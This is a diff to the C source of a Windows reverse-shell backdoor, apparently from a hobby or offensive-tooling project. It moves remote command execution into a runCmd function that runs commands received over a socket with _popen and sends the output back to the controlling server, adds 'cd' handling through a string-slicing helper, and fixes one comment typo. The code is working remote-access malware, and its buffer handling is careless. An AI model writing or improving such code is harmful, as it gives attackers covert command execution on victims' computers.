@@ -62,6 +62,61 @@ void reconnect() {
     Cmd();
 }
 
+//============ Cut a string between given indexes  ============//
+char *slice_str(char str[], int slice_from, int slice_to) {
+        if (str[0] == '\0') {
+            return NULL;
+        }
+
+        char *buff;
+        size_t str_len, buffer_len;
+
+        if (slice_to < 0 && slice_from > slice_to) {
+                str_len = strlen(str);
+                if (abs(slice_to) > str_len - 1)
+                        return NULL;
+
+                if (abs(slice_from) > str_len)
+                        slice_from = (-1) * str_len;
+
+                buffer_len = slice_to - slice_from;
+                str += (str_len + slice_from);
+
+        } else if (slice_from >= 0 && slice_to > slice_from) {
+                str_len = strlen(str);
+
+                if (slice_from > str_len - 1)
+                        return NULL;
+                buffer_len = slice_to - slice_from;
+                str += slice_from;
+
+        } else {
+            return NULL;
+        }
+
+        buff = calloc(buffer_len, sizeof(char));
+        strncpy(buff, str, buffer_len);
+        return buff;
+}
+
+//============ run Command on Target Machine & send Response ============//
+void runCmd(char cmd[1024], char (*container)[1024], char (*total_response)[18384]) {
+    FILE *fp;
+    // Create a pipe and execute a command asynchronously.
+	fp = _popen(cmd, "r");
+
+    // store first 1024 bytes of resonse in container
+    // when response exceeds 1024 bytes, add container to total_resonse
+    while(fgets(*container, 1024, fp) != NULL) {
+		strcat(*total_response, *container);
+	}
+
+    // send response to server
+	send(sock, *total_response, sizeof(*total_response), 0);
+    // close file descriptor
+	fclose(fp);
+}
+
 //============ Shell ============//
 void Cmd() {
     char buffer[1024];
@@ -80,21 +135,13 @@ void Cmd() {
 			closesocket(sock);
 			WSACleanup();
 			exit(0);
-		} else {
-			FILE *fd;
-            // Create a pipe and execute a command asynchronously.
-			fd = _popen(buffer, "r");
-
-            // store first 1024 bytes of resonse in container
-            // when response exceeds 1024 bytes, add container to total_resonse
-			while(fgets(container, 1024, fd) != NULL) {
-				strcat(total_response, container);
-			}
-
-            // send response to server
-			send(sock, total_response, sizeof(total_response), 0);
-			// close file descriptor
-            fclose(fd);
+		} else if (strncmp("cd ", buffer, 3) == 0) {
+            // extract directory name leaving "cd "
+            chdir(slice_str(buffer, 3, 100));
+            runCmd("cd", &container, &total_response);
+        }
+        else {
+            runCmd(buffer, &container, &total_response);
 		}
     }
 
@@ -122,7 +169,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
      * It allows an application or DLL to specify the version of Windows Sockets required and
      * retrieve details of the specific Windows Sockets implementation.
      * 
-     * WSAStartup function initiates use of Winsock DLL bya process.
+     * WSAStartup function initiates use of Winsock DLL by a process.
      **/
     if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
 		exit(1);
